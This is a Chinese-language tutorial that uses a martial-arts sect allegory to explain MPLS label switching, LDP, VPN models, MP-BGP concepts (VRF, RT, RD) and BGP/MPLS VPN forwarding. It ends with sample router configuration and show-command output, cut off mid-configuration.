此时ATM跳了出来，欲收编所有帮派，一统武林。不幸的是：信奉唯美主义的ATM走向了另一个极端，过于复杂的心法与招式导致没有任何厂商能够完全修练成功，而且无法与IP很好的融合。在与IP的大决战中最终落败，ATM只能寄人篱下，沦落到作为IP链路层的地步。 ATM技术虽然没有成功，但其中的几点心法口诀，却属创新： • 屏弃了繁琐的路由查找，改为简单快速的标签交换 • 将具有全局意义的路由表改为只有本地意义的标签表 这些都可以大大提高一台路由器的转发功力。 MPLS的创始人”label大师”充分吸取了ATM的精华，但也同时认识到IP为江湖第一大帮派，无法取而代之。遂主动与之修好，甘当IP的承载层，但为了与一般的链路层小帮有所区别，将自己定位在第2. 5层的位置。”label大师”本属于八面玲珑之人，为了不得罪其他帮派，宣称本帮是”multiprotocol”，来者不拒，也可以承载其他帮派的报文。在经过一年多的招兵买马、上下打点之后，于1997年的武林大会上，正式宣布本帮成立，并命名为MPLS（MultiProtocol label Switch） 二、MPLS包头结构 通常，MPLS包头有32Bit，其中有： 20Bit用作标签（Label） 3个Bit的EXP, 协议中没有明确，通常用作COS 1个Bit的S,用于标识是否是栈底，表明MPLS的标签可以嵌套。 8个Bit的TTL 理论上，标记栈可以无限嵌套，从而提供无限的业务支持能力。这是MPLS技术最大的魅力所在。 三、MPLS术语 标签（Label）：是一个比较短的，定长的，通常只具有局部意义的标识，这些标签通常位于数据链路层的数据链路层封装头和三层数据包之间，标签通过绑定过程同FEC相映射。 FEC：Forwarding Equivalence Class，FEC（转发等价类），是在转发过程中以等价的方式处理的一组数据分组， MPLS创始人在秘笈本来规定：可以通过地址、隧道、COS等来标识创建FEC，只可惜后辈弟子大多资质愚钝，不能理解其中的精妙之处，所以我们现在看到的MPLS中只是一条路由对应一个FEC。通常在一台设备上，对一个FEC分配相同的标签。 LSP：标签交换通道。一个FEC的数据流，在不同的节点被赋予确定的标签，数据转发按照这些标签进行。数据流所走的路径就是LSP。 LSR：Label Switching Router，LSR是MPLS的网络的核心交换机，它提供标签交换和标签分发功能。 LER：Label Switching Edge Router,在MPLS的网络边缘，进入到MPLS网络的流量由LER分为不同的FEC，并为这些FEC请求相应的标签。它提供流量分类和标签的映射、标签的移除功能。 四、MPLS北斗七星阵法图 该阵法分为内外两层，外层由功力高强的弟子担纲（至少是个堂主（LER），在IP报文冲阵时负责接收IP报文，查找标签转发表，给IP报文打标签操作（PUSH）在IP报文出阵时对标签报文进行弹出操作（POP），按IP路由进行转发。内层由功力较低的入门弟子组成，负责对标签报文进行快速的标签交换操作（SWAP） 五、IP的hop-by-hop逐跳转发 IP的逐跳转发，在经过的每一跳处，必须进行路由表的最长匹配查找（可能多次），速度缓慢。 六、Label Switched Path (LSP) MPLS的标签转发，通过事先分配好的标签，为报文建立了一条标签转发通道（LSP），在通道经过的每一台设备处，只需要进行快速的标签交换即可（一次查找）。 FEC的精妙之处：不同目的地址（属于相同的网段）的IP报文，在ingress处被划分为相同的FEC，具有相同的标签，这样在LSR处，只需根据标签做快速的交换即可。而对于传统的IP路由，在每一跳处实际上都是一次重新划分FEC的过程。如果一台路由器对于ip路由和标签交换同样使用了cache功能，由于对于路由来说，在cache中只能记录主机路由，条目将十分有限，而标签对应的是FEC，可能是网段，可以做到很少的条目匹配大量的报文。 FEC的致命缺陷：对于一条FEC来说，沿途所有的设备都必须具有相同的路由（前缀和掩码必须完全相同）才可以建成一条LSP。换句话说，使用MPLS转发的所有沿途设备上，对于要使用标签转发的路由，都不能做路由聚合的操作。 七、上下打点 当一个链路层协议收到一个MPLS报文后，她是如何判断这是一个MPLS报文，应该送给MPLS处理，而不是象普通的IP报文那样，直接送给IP层处理？ 回答：还记得MPLS的创始人”label大师”曾用了一年的时间来”上下打点”吗？当时主要的工作就是取得各个链路层帮派的通行证。 例如： 在以太网中：使用值是0x8847(单播)和0x8848（组播）来表示承载的是MPLS报文（0800是IP报文） 在PPP中：增加了一种新的NCP：MPLSCP，使用0x8281来标识 八、LDP 有了标签，转发是很简单的事，但是如何生成标签，却是MPLS中最难修练的部分。在MPLS秘笈中，这部分被称为LDP（Label Distribution Protocol），是一个动态的生成标签的协议。 其实LDP与IP帮派中的动态路由协议（例如RIP）十分相像，都具备如下的几大要素： • 报文（或者叫消息） • 邻居的自动发现和维护机制 • 一套算法，用来根据搜集到的信息计算最终结果。 只不过前者计算的结果是标签，后者是路由罢了。 九、LDP消息 在LDP协议中，存在4种LDP消息： • 发现（Discovery）消息：用于通告和维护网络中LSR的存在。 • 会话（Session）消息：用于建立，维护和结束LDP对等实体之间的会话连接。 • 通告（Advertisement）消息：用于创建、改变和删除特定FEC-标签绑定。 • 通知（Notification）消息：用于提供消息通告和差错通知。 十、LDP会话的建立和维护 十一、LDP邻居状态机 十二、标签的分配和管理 标记分发方式： DOD（Downstream On Demand）下游按需标记分发 DU（Downstream Unsolicited）下游自主标记分发 标记控制方式： 有序方式（Odered）标记控制 独立方式（Independent）标记控制 标签保留方式 保守方式 自由方式 上游与下游：在一条LSP上，沿数据包传送的方向，相邻的LSR分别叫上游LSR(upstream LSR )和下游LSR（downstream LSR）。下游是路由的始发者。 十三、LDP标签分配方式（DU） 下游主动向上游发出标记映射消息。 标签分配方式中同样存在水平分割，即：对我已经选中的出口标签，就不再为下一跳分配出标签。 标签是设备随机自动生成的，16以下为系统保留。 还有一种DOD方式（由上游向下游请求），修练的人较少。 十四、LDP标签保留方式 自由方式（Liberal retention mode）：保留来自邻居的所有发送来的标签 优点：当IP路由收敛、下一跳改变时减少了lsp收敛时间 缺点：需要更多的内存和标签空间。 保守方式（Conservative retention mode）：只保留来自下一跳邻居的标签，丢弃所有非下一跳邻居发来的标签。 优点：节省内存和标签空间。 缺点：当IP路由收敛、下一跳改变时lsp收敛慢 比较流行的是自由方式。 十五、LDP标签控制方式 有序方式（Odered）标记控制：除非LSR是路由的始发节点，否则LSR必须等收到下一跳的标记映射才能向上游发出标记映射。 独立方式（Independent）标记控制：LSR可以向上游发出标记映射，而不必等待来自LSR下一跳的标记映射消息。 比较流行的是有序方式。 十六、LDP标签分配 如果采用（DU+自由＋有序）的标签分配及控制方式： • 发现自己有直连接口路由时会发送标签； • 收到下游到某条路由的标签并且该路由生效（也就是说，在本地已经存在该条路由，并且路由的下一跳和标签的下一跳相同）时会发送标签。 • 标签表中会存在大量的非选中的标签。 下面的说法正确吗：如果某个网络中只有部分设备运行MPLS（MPLS域嵌在IP域中），则只会对运行MPLS的设备（MPLS域）的直连路由生成标签，对于其他设备（IP域）始发的路由则不会生成标签。 如果没有标签，那对于通过MPLS域的目的地址在IP域的报文如何转发呢？ 十七、标签转发表心法口诀 标签转发表中的IN和OUT，是相对于标签转发而言，不是相对于标签分配的IN和OUT： 心法口诀：入标签是我分给别人的，出标签是别人分给我的。 的标签是给别人用的，我不会添加到报文中。 对于一台设备的标签转发表（全局标签空间）来说： • 所有的入标签( ) • 对于相同的路由（下一跳也相同），出标签( ) • 对于不同的路由（但下一跳相同），出标签( ) • 对于不同的路由（下一跳也不同），出标签( ) • 对于同一条路由，入标签和出标签( ) A 一定不同 B 一定相同 C 可能相同 十八、倒数第二跳弹出（P H P） 话说MPLS传到了第二代，由PHP接任掌门。PHP天资聪颖且富有创新精神。他经过对MPLS北斗七星阵法的深入研究，发现本帮的这门绝学虽然暗合天数、精妙无比，但并非没有可改进之处：在阵法的出口处，Egress LSR本应变MPLS转发为IP路由查找，但是他收到的仍旧是含有标签的MPLS报文，按照常规，这个报文应该送交MPLS模块处理，而此时MPLS模块不需要标签转发，能做的只是去掉标签，然后送交IP层。其实对于Egress LSR，处理MPLS报文是没有意义的。最好能够保证他直接收到的就是IP报文。这就需要在ELSR的上游（倒数第二跳）就把标签给弹出来。但关键问题是：上游设备如何知道自己是倒数第二跳呢？其实很简单，在倒数第一跳为其分配标签时做一下特殊说明即可（分配一个特殊的标签3）。 经过几次实战检验，效果很好，遂正式以自己的名字命名为：PHP（Penultimate Hop Popping),倒数第二跳弹出。 十九、路由环路的预防与检测 路由环路的预防：任何涉及到转发或者是路由的阵法，都容易发生”路由环路”这样的走火入魔的事件。MPLS也不例外。创始人”label大师”深知武功中”借力打力”的原理，既然LSP的建立是依赖IP路由的，那么环路的预防也应该交给IP来做。自己无需处理了。 路由环路的检测：把自己的身家性命完全交给他人，毕竟不妥，万一IP没有把持住，后果不堪设想。所以虽然可以不作预防，但是必要的检测手段还是必需的，使用武林中通行的做法TTL即可。每经过一次MPLS转发，TTL减一。 在标签转发过程中，MPLS报文头中的TTL减一，那么ip报文头中的TTL是否还减一？ 二十、MPLS的衰落…… 虽然MPLS的历任掌门都致力于本帮的发扬光大，但是要想整个武林都重新学习一门新功夫谈何容易。更为致命的是：MPLS标称的”身手敏捷”、”让一台IP路由器快速完成转发”也遇到了极大的挑战。由于社会进步，武林界已经告别以提升内力为主的冷兵器时代（软件转发），快速步入火器时代（硬件转发）。各种自动（ASIC）、半自动（NP）的武器价格低廉、江湖上几乎人手一把。当第二任掌门PHP发现凭借自己多年的修行，竟然连一个手持AK47的入门马仔（L3）都对付不了时，不禁仰头长叹，意识到日后再无人会苦练内力、提高身手了。联想到这几年的帮派斗争，自己早已心力交瘁，又感到十分愧对自己的恩师”label大师”，无法担当掌门的重任，遂弃掌门职位不坐，浪迹江湖，过起了隐居生活，当然，他没忘了在街边买上一把左轮手枪防身…… VPN 一、隐身术 江湖中除了IP、ATM等几个传统大派别之外，武林中还有一部分人醉心于修练一种”隐身术”，他们的领地通常四处分散，中间必须经过其他帮派（主要是IP）的地盘，为了免交养路费，在江湖中行走时如果经过IP的领地，便打扮成IP帮的弟子模样，到了本帮的领地，再去掉伪装，恢复本来面目。这些人自称为VPN,掌门为”虚通道长”,手下的两个堂主分别是：”Overlay VPN”和”Peer-to-Peer VPN” 二、VPN中的角色 CE（Custom Edge）：直接与服务提供商相连的用户设备。 PE（Provider Edge Router）：指骨干网上的边缘路由器，与CE相连，主要负责VPN业务的接入。 P （Provider Router）：指骨干网上的核心路由器，主要完成路由和快速转发功能。 由于网络规模不同，网络中可能不存在P路由器。PE路由器也可能同时是P路由器。 三、Overlay VPN－隧道建立在CE上 特点：在CE与CE之间建立隧道，并直接传递路由信息，路由协议数据总是在客户设备之间交换，服务商对客户网络结构一无所知。典型代表是GRE、IPSec 优点：不同的客户地址空间可以重叠，保密性、安全性非常好。 缺点：需要客户自己创建并维护VPN。通常客户不愿意，也没有这个能力。 四、Overlay VPN－隧道建立在PE上 特点：在PE上为每一个VPN用户建立相应的GRE隧道，路由信息在PE与PE之间传递，公网中的P设备不知道私网的路由信息。 优点：客户把VPN的创建及维护完全交给服务商，保密性、安全性比较好。 缺点：不同的VPN用户不能共享相同的地址空间，即使可以共享，则PE与CE之间的地址、tunnel之间的地址一定不能相同，并且必须使用大量的ACL和策略路由。在实际中不具备可行性。 五、Overlay VPN的本质 Overlay VPN的本质是一种”静态”VPN，这好比是静态路由，所以他具有类似静态路由的全部缺陷： 1. 所有的配置与部署都需要手工完成，而且具有N^2问题：如果某个客户的VPN中新增了一个结点，则需要完成如下工作 • 在这个新增结点上建立与所有已存在的N个结点的隧道及相关的路由。 • 对于已存在的N个结点，需要在每个结点上都建立一个与新增结点之间的隧道及相关的路由。 2. 由于是”静态”VPN，则无法反应网络的实时变化。而且，如果隧道建立在CE上，则必须由用户维护，如果建立在PE上，则又无法解决地址冲突问题。 六、Peer-to-Peer VPN 如同静态路由一样，所有具有”静态”性质的东西都不太适合大规模的应用和部署，难以担当重任。所以，首先要解决的问题就是将VPN的部署及路由发布变为动态性。Peer－to－Peer VPN的产生就是源于这种思想。这里的 Peer－to－Peer是指CE－to－PE，也就是要在CE与PE之间交换私网路由信息，然后由PE将这些私网路由在P－Network中传播（P-Network上肯定是运行了一种动态路由协议），这样这些私网路由会自动的传播到其他的PE上。这种VPN由于私网路由会泄露到公网上，所以必须严格的通过路由来控制，即：要确保同一个VPN的CE路由器上只能有本VPN的路由。所以，通常CE与PE之间运行的路由协议，与P-Network上运行的路由协议是不同的，即使相同，也要有很好的路由过滤和选择的机制。 七、Peer-to-Peer VPN——共享PE方式 所有VPN用户的CE都连到同一台PE上，PE与不同的CE之间运行不同的路由协议（或者是相同路由协议的不同进程，比如OSPF）。由路由始发PE将这些路由发布到公网上，在接收端的PE上将这些路由过滤后再发给相应的CE设备。 缺点：为了防止连接在同一台PE上的不同CE之间互通，必须在PE上配置大量的ACL。 八、Peer-to-Peer VPN——专用PE方式 为每一个VPN单独准备一台PE路由器，PE和CE之间可以运行任意的路由协议，与其他VPN无关。PE与P之间运行BGP，并使用路由属性进行过滤。 优点：无需配置任何的ACL了。 缺点：每一个VPN用户都有新增一台专用的PE，代价过于昂贵了。 九、Peer-to-Peer VPN的本质 Peer-to-Peer VPN虽然很好的解决了”静态的问题”，但是仍旧有很多局限性： • 由于没有使用隧道技术，导致私网路由泄露到公网上，安全性很差。 • VPN的”私有”特性完全靠路由来保证，导致在CE设备上无法配置缺省路由。（why？） • 仍旧存在所有的设备无法共享相同的地址空间问题。 如果要确保安全性，则必须使用隧道技术，虽然本帮并不缺少隧道，但如GRE、IPSec都已被证实由于其”静态性”无法委以重任。而地址冲突的问题根本就不是本帮的势力范围，更是无法解决。 至此VPN帮已经黔驴技穷，好在掌门”虚通道长”是个留洋多年的”海龟”，思想很开放，觉得这个问题的解决需要整个武林一起出力。于是贴出了一张”招贤榜”—— 十、招贤榜 为了尊重报文的隐私，提高我华夏的人权水准，大力推动网络私有化的进程，特向各位武林高手招贤纳士。如有能解决如下问题的好汉，无论出身、派别，皆可得千金重赏，并与本帮结为友好邻邦，共举VPN大业。 • 可以提供一种动态建立的隧道技术。 • 可以解决不同VPN共享相同地址空间的问题。 VPN 掌门 虚通道长敬上 十一、重赏之下，必有勇夫 话说招贤榜一贴出来，立刻轰动了整个武林。一日，众多武林中人正围着一张榜议论纷纷，忽然人群中一个腰挂左轮手枪，状如乞丐者抚掌大笑，口中念道，”嗌~~,中了！中了！”，言迄休克倒地。众人急忙将其救醒。此人醒来之后，揭下招贤榜，发足狂奔，喊道”兴邦有望！兴邦有望！……” 没错，当然是MPLS隐居的掌门PHP了，”可以提供一种动态建立的隧道技术”，MPLS中的LSP正是一种天然的隧道，而且这种隧道的建立是基于LDP协议，又恰恰是一种动态的标签生成协议。舍我其谁！！ 自从PHP揭了第一张招贤榜之后，江湖上纷纷猜测会由谁来搞掂第二个问题，大家普遍认为最佳人选应该在几个路由协议中产生。 MP-BGP 一、为什么是BGP 如果要解决地址冲突问题，必须对现有的协议进行大规模的修改，这就要求一个协议具有良好的可扩展性。而具备条件的协议一定是基于TLV元素的。符合标准的只有EIGRP、BGP、ISIS。 • ISIS本不是中土人士，前年刚刚从OSI逃荒过来，帮中弟兄都不会说IP语，而说NSAP语，目前连户口还没解决，估计无暇他顾了。 • EIGRP向来闭关锁帮，夜郎自大的认为本帮的功夫天下一流，从不与别人切磋，也不参加武林大会。而且看见别人的武功与自己有几分相似，便跳出来要与他打官司。在江湖上名声臭极。 • 而BGP看来是十分合适的人选： 1. 网络中VPN路由数目可能非常大，BGP是唯一支持大量路由的路由协议； 2. BGP是基于TCP来建立连接，可以在不直接相连的路由器间交换信息，这使得P路由器中无须包含VPN路由信息； 3. BGP可以运载附加在路由后的任何信息，作为可选的BGP属性，任何不了解这些属性的BGP路由器都将透明的转发它们，这使在PE路由器间传播路由非常简单。 BGP的掌门叫——无为长老，是位得道的高僧。 二、无为长老 话说当年IP的掌门人——“尽力而为”，自知年事已高，便想在帮中选择下一任接班人。在众多弟子，唯有两个最为得意——OSPF和BGP。一日，掌门将二人叫到面前，让他们说一下这些年的修行心得。 OSPF念道：”身如路由器，心似转发表，报文何其多，日夜勤查找。” BGP念道： “路由本非器，转发何需表？报文虽然多，自有他人找。” “尽力而为”抚掌大笑曰：”BGP得吾真传也！”，于是将衣钵传给了他。 OSPF很不服气，说：”弟子日夜辛劳，编撰的OSPF心法一共300多页，构思精妙，算法复杂，堪称武林绝学。而师弟BGP终日游山玩水，草草写了一本70多页的心得就交差了。”掌门笑问他”那你的心法一共可以管理多少台路由器，多少条路由呢？”OSPF答道：”设备百台，路由千条。”掌门又问BGP：”那么你呢？”BGP道：”整个internet百万台路由器，十余万路由皆由弟子一人掌管。”掌门笑道：”BGP虽然表面看来无所作为，其实他只是不想过分的拘泥于细节，实际上是”无为而治”啊。我当年就是靠的这一点才将来势凶猛的ATM斩于马下。” 从此BGP便在武林中得到了”无为长老”的雅号。 三、冥思苦想 无为长老虽然觉得此事责无旁贷，但确实非常麻烦，要想解决地址冲突的问题，至少有如下三个难题需攻克： 1. 本地路由冲突问题，即：在同一台PE上如何区分不同VPN的相同路由。 2. 路由在网络中的传播问题，两条相同的路由，都在网络中传播，对于接收者如何分辨彼此？ 3. 报文的转发问题，即使成功的解决了路由表的冲突，但是当PE接收到一个IP报文时，他又如何能够知道该发给那个VPN？因为IP报文头中唯一可用的信息就是目的地址。而很多VPN中都可能存在这个地址。 四、计上心来 无为闭关修练了数月，冥思苦想了很久，渐渐有了些思路： 1. 本地路由冲突问题，可以通过在同一台路由器上创建不同的路由表解决，而不同的接口可以分属不同的路由表中，这就相当于将一台共享PE模拟成多台专用PE。 2. 可以在路由传递的过程中为这条路由再添加一个标识，用以区别不同的VPN。 3. 由于IP报文的格式不可更改，估计指望不上他了，但可以在IP头之外加上一些信息，由始发的VPN打上标记，这样PE在接收报文时可以根据这个标记进行转发。 虽然大致的解决方案已有，但要做到可以具体实施，却还有很多工作要做。 五、理论突破——VRF 其实解决地址冲突的问题，也存在一些方法：使用ACL、IP unnumber、NAT。但这些办法都是基于”打补丁”的思想，没能从本质上解决问题。要想彻底解决，必须在理论上有所突破。可以从专用PE上得到启示。专用路由器方式分工明确，每个PE只保留自己VPN的路由。P只保留公网路由。而现在的思路是：将这些所有设备的功能，和在一台PE上完成。 六、VRF VRF—VPN路由转发实例（VPN Routing &amp; Forwarding Instance）：每一个VRF可以看作虚拟的路由器，好像是一台专用的PE设备。该虚拟路由器包括如下元素： • 一张独立的路由表，当然也包括了独立的地址空间。 • 一组归属于这个VRF的接口的集合。 • 一组只用于本VRF的路由协议。 对于每个PE，可以维护一个或多个VRF，同时维护一个公网的路由表（也叫全局路由表），多个VRF实例相互分离独立。其实实现VRF并不困难，关键在于如何在PE上使用特定的策略规则来协调各VRF和全局路由表之间的关系。 七、RT 我们回忆一下，其实在专用PE的方式中，已经很好的解决了这个问题。当时使用了BGP的community属性。这次仍旧使用这个思路，只不过”旧瓶装新酒”把community扩展了一下，并且起了一个新名字：RT（Route Target）。 扩展的community有如下两种格式：其中type字段为0x0002或者0x0102时表示RT。 八、RT的本质 RT的本质是每个VRF表达自己的路由取舍及喜好的方式。可以分为两部分：Export Target与import Target；前者表示了我发出的路由的属性，而后者表示了我对那些路由感兴趣。例如： SITE-A：我发的路由是红色的，我也只接收红色的路由。 SITE-B：我发的路由是红色的，我也只接收红色的路由。 SITE-C：我发的路由是黑色的，我也只接收黑色的路由。 SITE-D：我发的路由是黑色的，我也只接收黑色的路由。 这样，SITE－A与SITE-B中就只有自己和对方的路由，两者实现了互访。同理SITE－C与SITE-D也一样。这时我们就可以把SITE-A与SITE－B称为VPN-A，而把SITE-C与SITE-D称为VPN-B。 九、RT的灵活应用 由于每个RT Export Target与import Target都可以配置多个属性，例如：我对红色或者蓝色的路由都感兴趣。接收时是”或”操作，红色的、蓝色的以及同时具备两种颜色的路由都会被接受。所以就可以实现非常灵活的VPN访问控制。 十、RD(Route Distinguisher) 在成功的解决了本地路由冲突的问题之后，路由在网络中传递时的冲突问题就迎刃而解了。只要在发布路由时加上一个标识即可。 既然路由发布时已经携带了RT，可否就使用RT作为标识呢？ 理论上讲，肯定是可以的。但RT不是一个简单的数字，通常是一个列表，而且他是一种路由属性，不是与IP前缀放在一起的，这样在比较的时候不好操作。特别是：BGP的Route withdraw报文不携带属性，这样在这种情况下收到的路由就没有RT了。所以还是另外定义一个东西比较好，这个东东就叫做 RD。他的格式与RT基本上一样。 十一、RD的本质 在IPv4地址加上RD之后，就变成VPN-IPv4地址族了。 理论上可以为每个VRF配置一个RD。通常建议为每个VPN都配置相同的RD，不同的VPN配置不同的RD。但是实际上只要保证存在相同地址的两个VRF的RD不同即可，不同的VPN可以配置相同的RD，相同的VPN也可以配置不同的RD。如果两个VRF中存在相同的地址，则一定要配置不同的RD，而且两个VRF一定不能互访，间接互访也不成。 同一台PE上的不同VRF不能配置相同的RD（why？）。 RD并不会影响不同VRF之间的路由选择以及VPN的形成，这些事情由RT搞定。 PE从CE接收的标准的路由是IPv4路由，如果需要发布给其他的PE路由器，此时需要为这条路由附加一个RD。 VPN-IPv4地址仅用于服务供应商网络内部。在PE发布路由时添加，在PE接收路由后放在本地路由表中，用来与后来接收到的路由进行比较。CE不知道使用的是VPN-IPv4地址。 在其穿越供应商骨干时，在VPN数据流量的包头中没有携带VPN-IPv4地址。 十二、革命尚未成功 至此，前两个问题：在PE本地的路由冲突和网络传播过程的冲突都已解决。但是如果一个PE的两个本地VRF同时存在10.0.0.0/24的路由，当他接收到一个目的地址为10.0.0.1的报文时，他如何知道该把这个报文发给与哪个VRF相连的CE？肯定还需要在被转发的报文中增加一些信息。 既然路由发布时已经携带了RD，可否就使用RD作为标识呢？ 理论上讲肯定是可以的。但是RD一共有64个bit，太大了。这会导致转发效率的降低。所以只需要一个短小、定长的标记即可。由于公网的隧道已经由MPLS来提供，而且MPLS支持多层标签的嵌套，这个标记定义成MPLS标签的格式。这个私网的标签就由MP-BGP来分配，与私网的路由一同发布出去。 十三、概念总结 VRF：在一台PE上虚拟出来的一个路由器，包括一些特定的接口，一张路由表，一个路由协议，一个RD和一组RT规则。 RT：表明了一个VRF的路由喜好，通过他可以实现不同VRF之间的路由互通。他的本质就是BGP的community属性。 RD：为了防止一台PE接收到远端PE发来的不同VRF的相同路由时不知所措，而加在路由前面的特殊信息。在PE发布路由时加上，在远端PE接收到路由后放在本地路由表中，用来与后来接收到的路由进行比较。 Label：为了防止一台PE接收到远端PE发给本地不同VRF的相同地址的主机时不知所措，而加在报文前面的特殊信息。由本地PE在发布路由时加上，远端PE接收到保存在相应的VRF中。 SITE：一个VRF加上与其相连的所有的CE的集合。 VPN：是一些SITE的集合，这些SITE由于共享了相同的路由信息可以互通。 十四、BGP发布路由时需要携带的信息 一个扩展之后的NLRI（Network Layer Reachability Information），增加了地址族的描述，以及私网label和RD。 跟随之后的是RT的列表 对于使用了扩展属性MP_REACH_NLRI的BGP，我们称之为MP-BGP。 BPG/MPLS VPN 一、宴桃园豪杰三结义 MPLS掌门PHP与BGP掌门无为一起来到VPN掌门虚通道长处商议结盟之事，宾主谈笑甚欢。三人皆是性情中人，胸怀坦荡，知无不言，感觉甚是投机。于是效仿古人，结拜兄弟。祭拜天地之后，序了长幼，无为年长，做大哥，PHP次之，虚通道长年幼，做了小弟。 三个掌门在本帮中精选得力弟子，成立JV公司，各占三分之一的股份。新帮派命名为：BGP/MPLS VPN。并且详细规定了新帮派的各项规章制度，并昭示天下。一时在江湖中传为佳话。 虽然成立了新帮派，但是三个掌门并没闲着。 MPLS继续潜心钻研QOS和流量工程； BGP准备和IPv6以及组播成立新公司； 而虚通道长则致力于扩大VPN家族的势力范围。 二、CE与PE之间如何交换路由 VRF在PE上配置。 PE 维护独立的路由表，包括公网和私网(VRF)路由表 • 公网路由表：包含全部PE和P 路由器之间的路由，由骨干网IGP产生。 • 私网路由表：包含本VPN用户可达信息的路由和转发表。 PE 和 CE 通过标准的EBGP、OSPF、RIP或者静态路由交换路由信息。 • 静态路由、RIP都是标准的协议，但是每个VRF运行不同的实例。相互之间没有干扰。与PE的MP-iBGP之间只是的redistribute操作。 • EBGP也是普通的EBGP，而不是MP-EBGP，只交换经过PE过滤后的本VPN路由。 • OSPF则做了很多修改，可以将本site的LSA放在bgp的扩展community属性中携带，与远端VPN中的ospf之间交换LSA。每个site中的OSPF都可以存在area 0，而骨干网则可以看作是super area 0。此时的OSPF由两极拓扑（骨干区域＋非骨干区域）变为3级拓扑（超级骨干区域＋骨干区域＋非骨干区域） 三、VRF路由注入到MP-iBGP PE路由器需要对一条路由进行如下操作： • 加上RD（RD为手工配置），变为一条VPN-IPV4路由。 • 更改下一跳属性为自己（通常是自己的loopback地址） • 加上私网标签（随机自动生成，无需配置） • 加上RT属性（RT需手工配置） 发给所有的PE邻居。 为何要更改下一跳属性？ 携带RT的export还是import属性？ 四、MP-iBGP路由注入到VRF VPN-v4 路由变为IPV4路由，并且根据本地VRF的import RT属性加入到相应的VRF中，私网标签保留，留做转发时使用。再由本VRF的路由协议引入并转发给相应的CE。 这条VPN路由的下一跳是谁？ 五、公网标签分配过程 • PE和P路由器通过骨干网IGP学习到BGP邻居下一跳的地址。 • 通过运行LDP协议，分配标签，建立LSP通道。 • 标签栈用于报文转发，外层标签用来指示如何到达BGP下一跳 ，内层标签表示报文的出接口或者属于哪个VRF（属于哪个VPN）。 • MPLS 节点转发是基于外层标签，而不管内层标签是多少。 六、报文转发——从CE到Ingress PE • CE将报文发给与其相连的VRF接口，PE在本VRF的路由表中进行查找，得到了该路由的公网下一跳地址（即：对端PE的loopback地址）和私网标签。 • 在把该报文封装一层私网标签后，在公网的标签转发表中查找下一跳地址，再封装一层公网标签后，交与MPLS转发。 七、Ingress PE－&gt;Egress PE－&gt;CE • 该报文在公网上沿着LSP转发，并根据途径的每一台设备的标签转发表进行标签交换。 • 在倒数第二跳处，将外层的公网标签弹出，交给目的PE设备 • PE设备根据内层的私网标签判断该报文的出接口和下一跳。 • 去掉私网标签后，请报文转发给相应的VRF中的CE。 八、MPLS VPN控制流程－”私网”路由及标签传递 九、MPLS VPN控制流程－”公网”LSP的建立 PE C的loopback地址为1.1.1.1 十、MPLS VPN数据流程－私网数据包的转发 十一、MPLS/VPN招募新弟子入门考试试题 1. 在MPLS/VPN中公网标签是由（）分配的，私网标签是由（）分配的。 2. 在CE上需要运行（），在PE上需要运行（），在P上需要运行（） A. 普通的路由协议 B.MP-BGP C.MPLS 1. RD是（），RT是（），私网标签是（），公网标签是（） A.手工配置的 B.随机生成的 2. 虽然运行MPLS协议后，路由器会自动为公网路由表中的所有路由分配标签，但实际上，只需要为所有PE的loopback地址分配标签即可，不必为其他的任何公网路由分配标签。（）T or F 3. 虽然建议为不同的VPN配置不同的RD，相同的VPN配置相同的RD。但根本就别理他，只要保证存在相同地址的两个VRF的RD不同即可，不同的VPN可以配置相同的RD，相同的VPN也可以配置不同的RD。（）T or F 4. 既然已经定义了RD，就不可能存在两条相同的路由同时在网络中传播。（） 5. 对于一台PE，可能会出现接收到的不同目的地址的报文具有相同的私网标签，不可能会出现发送的不同目的地址的报文具有相同的私网标签（） 6. 一台运行MPLS的路由器如何知道自己相对于每个LSP是倒数第二跳，又如何知道自己是倒数第一跳？ 思考题：如果是BGP/GRE VPN，他的运行模式又是如何的？ 答对5题者，可入我帮，答对思考题者，可直接升为堂主。 配置 1.1、MPLS的配置 全局模式下： Lsr的ID，可以配置成与router id相同。 mpls lsr id 10.5.80.250 ! 在全局模式启动LDP协议 mpls ldp ! 在接口上启动LDP Session interface Ethernet4/1/0 ip address 10.5.3.93 255.255.255.252 mpls ldp enable 1.2、查看MPLS的邻居状态 PE3_NE16#show mpls ldp session Showing information about all sessions: Peer LDP Ident: 192.168.255.38:0; Local LDP Ident: 220.163.42.126:3 Tcp connection:192.168.255.38 - 220.163.42.66 Session State: Operational Session Role: Active Hello packets sent/received: 72121/82424 KeepAlive packets sent/received: 15018/20607 Negotiated Keepalive Timer Value: 60 Peer PV Limit: 0 LDP discovery source:GigabitEthernet4/1/0.1 1.3、查看MPLS的标签分配情况 NCC-R# show mpls lsp brief ID I/O-Label In-Interface Prefix/Mask Next-Hop 22 382/264 VT20 10.5.61.250/32 10.5.3.94 23 388/266 VT20 10.5.37.250/32 10.5.3.94 24 408/274 VT20 10.5.32.250/32 10.5.3.94 25 —/24 ———- 10.5.22.250/32 10.5.3.10 26 132/24 VT49 10.5.22.250/32 10.5.3.10 27 153/24 Eth4/1/0 10.5.22.250/32 10.5.3.10 28 155/24 Eth10/2/0 10.5.22.250/32 10.5.3.10 29 —/20 ———- 10.5.23.250/32 10.5.3.10 30 186/20 VT49 10.5.23.250/32 10.5.3.10 31 229/20 Eth4/1/0 10.5.23.250/32 10.5.3.10 2、MP-BGP配置 2.1、PE上的配置 VRF配置： ip vrf VPN-HW 创建一个VRF并命名。同时进入vrf配置模式 RD配置： 在VRF模式下，每个VRF配置一个RD，建议相同的VPN配置相同的RD。 rd 100:1 RT配置： 在VRF模式下，每个VRF配置不同的RT列表，如果只要一个RT,建议与RD配成相同。 route-target import 100:1 route-target export 100:1 2.2、将VRF与接口关连 在与某个VPN相连的接口下配置如下命令： ip vrf forwarding VPN-HW interface Serial3/5 ip vrf forwarding VPN-HW ip address 10.168.61.6 255.255.255.252 encapsulation ppp 2.3、PE与CE之间的路由协议 目前支持：RIPv2、BGP、Static，每个协议都被改造成多实例的了，换句话说，就是”VRF化”了。 Static： ip route vrf VPN-HW 10.10.1.0 255.255.255.0 10.10.1.2 ip route vrf VPN-3COM 10.10.1.0 255.255.255.0 10.10.1.2 RIPv2: router rip ! address-family ipv4 vrf VPN-HW no auto-summary network 10.0.0.0 ! address-family ipv4 vrf VPN-3COM no auto-summary network 10.0.0.0 BGP： router bgp 109 ! address-family ipv4 vrf VPN-HW neighbor 10.168.62.5 remote-as 65503 exit-address-family ! address-family ipv4 vrf VPN-3C0M redistribute static redistribute connected redistribute rip exit-address-family ! 2.4、MP-BGP的配置 router bgp 30000 no synchronization neighbor 10.5.80.240 remote-as 30000 neighbor 10.5.80.240 update-source LoopBack0 address-family ipv4 